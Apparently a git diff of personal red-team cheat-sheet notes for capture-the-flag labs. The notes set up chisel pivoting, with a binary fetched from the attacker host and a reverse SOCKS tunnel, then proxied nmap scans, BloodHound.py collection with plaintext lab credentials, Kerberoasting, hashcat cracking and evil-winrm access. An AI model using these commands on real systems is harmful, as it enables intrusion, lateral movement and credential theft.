@@ -567,32 +567,61 @@ sudo -l:
 
 ##########
 CHISEL PIVOTING + SCAN cf: REDTEAM CAPSTONE 
+https://www.youtube.com/watch?v=pbR_BNSOaMk
 ##########
 Pivoting Chisel: https://github.com/jpillora/chisel/releases
 
 Pivoting with Chisel (Perform a successfull Nmap scan from Kali by passing through the COMPROMISE VPNMACHINE):
-In compromise Machine:
-    root@ip-10-200-116-12:/home# mkdir adib
-    root@ip-10-200-116-12:/home# ls
-    adib  ubuntu
-    root@ip-10-200-116-12:/home# cd adib
-    root@ip-10-200-116-12:/home/adib# 
-
 In Kali:
     sudo python3 -m http.server
     add the chisel bynari for linux:
         https://github.com/jpillora/chisel/releases
 
-In Machine:
+In Compromised Machine:
     root@ip-10-200-116-12:/home/adib# wget http://10.50.113.14:8000/chisel
     root@ip-10-200-116-12:/home/adib# chmod +x chisel
                 
+In Kali:
+    chisel server --socks5 --reverse:
+        create a 'fingerprint' value ex: 64..y5/.....cQ4Np=
+
+In Compromised Machine:
+    root@ip-10-200-116-12:/home/adib# ./chisel client --fingerprint 64..y5/.....cQ4Np= 10.50.113.14:8080 R:socks
 
 In Kali:
-    chisel server -p 8000 -reverse
+we change the proxychain conf file:
+    └─$ sudo gedit /etc/proxychains4.conf
+    socks5 	127.0.0.1 1080
+─$ proxychains nmap 10.200.116.31 -vv
 
-In Machine:
-    root@ip-10-200-116-12:/home/adib# ./chisel client <KaliIP:PORT> R:socks
 
-In Kali:
-proxychains nmap -sT -Pn 10.200.116.31
+#########
+BloodHound.py 
+#########
+BloodHound.py izi way:
+        https://github.com/dirkjanm/BloodHound.py
+        https://github.com/fox-it/bloodhound-import
+
+        git clone https://github.com/fox-it/bloodhound-import.git
+
+
+        https://github.com/dirkjanm/BloodHound.py
+            python3 bloodhound.py -d HTB.local -u 'Amanda' -p 'Ashare1972' -c all -ns 10.10.10.103  <---Easyest Way Bro it's 2024 start to be lazy as possible - Chill Man - Relax Man ahaha
+
+
+###############
+KERBEROSTABLE ACCOUNT KERBEROASTING
+###############
+If BloodHound or Else find KERBEROSTABLE ACCOUNTS:
+
+REDTEAMCAPSTONE + Active.txt
+KERBEROASTABLE ACCOUNTS:
+    proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py <corp.thereserve.loc>/<User>:"<Passwd>@" -dc-ip 10.200.116.102  -request
+
+WE GET The Administrator Ticket HASH with the REF (krb5tgs$23):
+        hashcat NTLM.hash /usr/share/wordlists/rockyou.txt -m 13100  (13100 - TGS-REP)
+
+ We can use evilWin-rm to access machine:
+    proxychains -q evil-winrm -u svcScanning -p <Passwd> -i 10.200.116.31
+
+    *Evil-WinRM* PS C:\Users\svcScanning\Documents> 
